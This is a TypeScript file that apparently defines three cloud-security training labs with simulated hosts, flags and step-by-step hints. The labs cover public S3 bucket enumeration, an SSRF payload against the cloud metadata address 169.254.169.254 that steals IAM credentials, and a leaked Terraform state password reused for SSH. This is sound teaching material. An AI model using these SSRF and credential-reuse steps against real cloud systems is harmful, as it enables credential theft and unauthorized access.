import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const cloudSecurityLabs: LabScenario[] = [
  {
    id: 'cloud-public-s3-bucket',
    title: 'Cloud: Public S3 Bucket Exposure',
    difficulty: 'Easy',
    category: 'Cloud',
    briefing:
      'Meridian Corp hosts static assets on a cloud object storage bucket. Recon revealed the bucket name ' +
      '(meridian-corp-backups) — check whether it was left with public read access, a shockingly common ' +
      'real-world cloud misconfiguration. A bucket listing only shows you filenames; you still have to fetch ' +
      'each object explicitly, and the most sensitive file here is hidden behind a nested prefix that the ' +
      'top-level listing does not expand.',
    objectives: [
      { text: 'curl "http://10.10.106.1/meridian-corp-backups/"', why: 'This mirrors `aws s3 ls` against a bucket with no credentials — if it returns a listing instead of an AccessDenied error, public read is confirmed. Note the objects AND the archive/ prefix at the bottom; prefixes are subfolders that need their own listing request.' },
      { text: 'curl "http://10.10.106.1/meridian-corp-backups/db-backup-2026-07.sql"', why: 'Do not assume the first-listed file is the sensitive one — real bucket-leak triage means checking each object. This one turns out to hold only a stale admin password hash, not the crown jewels.' },
      { text: 'curl "http://10.10.106.1/meridian-corp-backups/archive/"', why: 'List the nested prefix noticed in the first request. Attackers routinely miss data hidden one folder deeper because the top-level listing looked "handled" — this step is exactly why thorough bucket enumeration matters.' },
      { text: 'curl "http://10.10.106.1/meridian-corp-backups/archive/q3-2026-payroll-final.csv"', why: 'Fetch the actual sensitive object by its exact key, discovered from the nested listing. This is the real payroll export — and the flag.' },
    ],
    hints: [
      'curl "http://10.10.106.1/meridian-corp-backups/"  to list top-level bucket contents — notice the archive/ prefix.',
      'curl "http://10.10.106.1/meridian-corp-backups/db-backup-2026-07.sql" — worth checking, but not the sensitive file.',
      'curl "http://10.10.106.1/meridian-corp-backups/archive/" to list the nested prefix.',
      'curl "http://10.10.106.1/meridian-corp-backups/archive/q3-2026-payroll-final.csv" to download the file the nested listing revealed.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 's3-emulator', ip: '10.10.106.1', os: 'Cloud object storage (S3-compatible)',
        services: [{
          port: 80, name: 'http', version: 'S3-compatible object storage',
          http: {
            '/meridian-corp-backups/':
              '<ListBucketResult><Contents><Key>db-backup-2026-07.sql</Key></Contents>' +
              '<Contents><Key>employee-export.csv</Key></Contents>' +
              '<CommonPrefixes><Prefix>archive/</Prefix></CommonPrefixes></ListBucketResult>\n' +
              '<!-- ACL: public-read (misconfigured) -->',
            '/meridian-corp-backups/db-backup-2026-07.sql': '-- Meridian Corp database backup\n-- WARNING: this bucket should never have been public\nINSERT INTO admin_users VALUES (1, \'admin\', \'hash...\');\n',
            '/meridian-corp-backups/employee-export.csv': 'name,email,ssn\nJohn Doe,john@meridiancorp.example,REDACTED\n',
            '/meridian-corp-backups/archive/':
              '<ListBucketResult><Contents><Key>archive/q3-2026-payroll-final.csv</Key></Contents></ListBucketResult>\n' +
              '<!-- nested prefix — not shown by the top-level listing\'s object list, only its CommonPrefixes -->',
            '/meridian-corp-backups/archive/q3-2026-payroll-final.csv':
              'employee_id,name,net_pay\n4471,J. Alvarez,4820.00\n' +
              '-- flag{public_s3_bucket_leaks_database_backup}',
          },
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'cloud-metadata-ssrf',
    title: 'Cloud: IAM Credential Leak via SSRF Unlocks a Gated Reports API',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'An internal reporting dashboard hosted on cloud infrastructure fetches a "data source" URL you control. ' +
      'This is the exact SSRF pattern from the Web Application Hacking module — now applied against the cloud ' +
      'instance metadata service to steal the instance\'s temporary IAM role credentials. The stolen ' +
      'AccessKeyId alone proves the leak; using it to authenticate to a second, gated internal endpoint proves ' +
      'the real, reportable impact.',
    objectives: [
      { text: 'curl "http://10.10.106.2/dashboard/datasource?url=https://example.com/data.json"', why: 'Confirm the data-source feature performs a genuine server-side fetch with a normal, harmless URL before attempting anything malicious — standard SSRF confirmation methodology.' },
      { text: 'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role"', why: 'Redirect the fetch to the cloud instance metadata service — the same address every major cloud provider uses, and unreachable from outside the instance, which is exactly why SSRF is how it gets stolen. This leaks a temporary AccessKeyId, not the flag itself.' },
      { text: 'curl -H "X-Access-Key-Id: AKIA-SIM-REPORT9F3" "http://10.10.106.2/internal/reports-export"', why: 'A stolen credential is only dangerous once it is used. Authenticating to the gated internal export endpoint with the leaked AccessKeyId demonstrates the full, reportable impact chain: SSRF -> metadata theft -> unauthorized data access.' },
    ],
    hints: [
      'curl "http://10.10.106.2/dashboard/datasource?url=https://example.com/data.json" — confirms normal behavior first.',
      'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role" — leaks a temporary AccessKeyId.',
      'curl -H "X-Access-Key-Id: AKIA-SIM-REPORT9F3" "http://10.10.106.2/internal/reports-export" — use the leaked key against the gated endpoint.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'reporting-dashboard', ip: '10.10.106.2', os: 'Cloud VM (IAM instance role attached)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {},
          vulnRoutes: [
            {
              kind: 'ssrf', path: '/dashboard/datasource', param: 'url',
              triggerSubstrings: ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1'],
              vulnerableResponse: '{"AccessKeyId":"AKIA-SIM-REPORT9F3","SecretAccessKey":"REDACTED-VIA-SSRF","Role":"reporting-role","note":"use AccessKeyId against /internal/reports-export"}',
              normalResponse: '{"status":"ok","rows":12}',
            },
            {
              kind: 'ssrf', path: '/internal/reports-export', param: 'X-Access-Key-Id', location: 'header',
              triggerSubstrings: ['AKIA-SIM-REPORT9F3'],
              vulnerableResponse: '{"status":"export_ready","download":"full-financials.csv","flag":"flag{cloud_metadata_ssrf_leaks_iam_role_credentials}"}',
              normalResponse: '{"error":"missing or invalid credentials"}',
            },
          ],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'cloud-exposed-terraform-state',
    title: 'Cloud: Exposed Terraform State Leaks a Password Reused as an SSH Foothold',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'A DevOps team accidentally left their Terraform state file readable on a public web endpoint. State ' +
      'files routinely contain plaintext secrets (database passwords, API keys) for every resource they manage ' +
      '— this is a very real, very common cloud misconfiguration, and confirming the exposure itself is worth ' +
      'the first flag. Here the leaked database password was also reused, unrotated, as the SSH password for a ' +
      'provisioning jump-host referenced in the same state file — proving that reuse grants a live foothold is ' +
      'the second, more severe flag.',
    objectives: [
      { text: 'nmap -sV 10.10.106.3', why: 'Enumerate the web server on the infra host before hunting for exposed files.' },
      { text: 'curl 10.10.106.3/robots.txt', why: 'Ops teams sometimes Disallow a path in robots.txt thinking that hides it — instead it points straight at the file they should have never left in the web root.' },
      { text: 'curl 10.10.106.3/terraform.tfstate to capture the first flag', why: 'Parse the leaked state: it lists two resources — an aws_db_instance with a plaintext password (and the first flag), and an aws_instance ("jump-host") whose tags note the same password was reused for provisioner SSH access, at a second IP address.' },
      { text: 'ssh deploy@10.10.106.4 using the password recovered from the state file, then cat user.txt for the second flag', why: 'Confirms the leaked secret is not just theoretically bad practice, but a live, working credential that grants an actual foothold on infrastructure the state file described — the escalation that earns the second flag.' },
    ],
    hints: [
      'nmap -sV 10.10.106.3',
      'curl 10.10.106.3/robots.txt might hint at the path, or just try: curl 10.10.106.3/terraform.tfstate — this contains the first flag.',
      'The state file lists a second host ("jump-host") — its tags explain the password was reused for provisioner SSH.',
      'ssh deploy@10.10.106.4 with the password from the state file, then cat user.txt for the second flag.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'infra-host', ip: '10.10.106.3', os: 'Ubuntu 22.04',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {
            '/': '<html><body><h1>Infra status page</h1></body></html>',
            '/robots.txt': 'User-agent: *\nDisallow: /terraform.tfstate\n',
            '/terraform.tfstate': JSON.stringify(
              {
                resources: [
                  {
                    type: 'aws_db_instance',
                    name: 'primary',
                    instances: [{ attributes: { username: 'dbadmin', password: 'Terraf0rm_Leak_2026!', note: 'flag{terraform_state_file_leaks_db_password}' } }],
                  },
                  {
                    type: 'aws_instance',
                    name: 'jump-host',
                    instances: [{
                      attributes: {
                        private_ip: '10.10.106.4',
                        tags: {
                          Note: 'provisioner reused the aws_db_instance password as the deploy user SSH password — rotate immediately (never done)',
                        },
                      },
                    }],
                  },
                ],
              },
              null,
              2,
            ),
          },
        }],
        users: [], root: dir({}),
      } as HostDef,
      {
        hostname: 'jump-host', ip: '10.10.106.4', os: 'Ubuntu 22.04',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.9p1' }],
        users: [{ username: 'deploy', password: 'Terraf0rm_Leak_2026!' }],
        root: dir({
          home: dir({ deploy: dir({ 'user.txt': file('A Terraform state secret, reused instead of rotated, turned an information leak into a live SSH foothold.\nflag{reused_state_secret_grants_ssh_foothold}\n') }) }),
        }),
      } as HostDef,
    ],
  },
];
